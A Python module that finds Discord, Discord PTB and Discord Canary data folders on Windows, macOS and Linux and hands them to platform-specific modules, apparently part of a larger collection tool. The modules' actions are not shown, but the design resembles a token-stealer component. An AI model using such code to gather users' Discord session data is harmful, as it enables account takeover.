from common.platform_base import PlatformHandlerBase
import os

class Discord(PlatformHandlerBase):
    def __init__(self):
        super().__init__()

    def execute_windows(self):
        from modules.discord.discord_windows import DiscordWindows

        windowsPaths = [
            path for path in [
            os.path.join(os.getenv("APPDATA"), "discord"),
            os.path.join(os.getenv("APPDATA"), "discordptb"),
            os.path.join(os.getenv("APPDATA"), "discordcanary"),
            ] if os.path.exists(path)
        ]

        discord = DiscordWindows(windowsPaths)
        return discord.run()

    def execute_macos(self):
        from modules.discord.discord_mac import DiscordMac

        macPaths = [
            path for path in [
            os.path.join(os.getenv("HOME"), "Library", "Application Support", "discord"),
            os.path.join(os.getenv("HOME"), "Library", "Application Support", "discordptb"),
            os.path.join(os.getenv("HOME"), "Library", "Application Support", "discordcanary"),
            ] if os.path.exists(path)
        ]

        discord = DiscordMac(macPaths)
        return discord.run()

    def execute_linux(self):
        from modules.discord.discord_linux import DiscordLinux

        linuxPaths = [
            path for path in [
            os.path.join(os.getenv("HOME"), ".config", "discord"),
            os.path.join(os.getenv("HOME"), ".config", "discordptb"),
            os.path.join(os.getenv("HOME"), ".config", "discordcanary"),
            ] if os.path.exists(path)
        ]

        discord = DiscordLinux(linuxPaths)
        return discord.run()

    def execute(self) -> tuple:
        return super().execute()
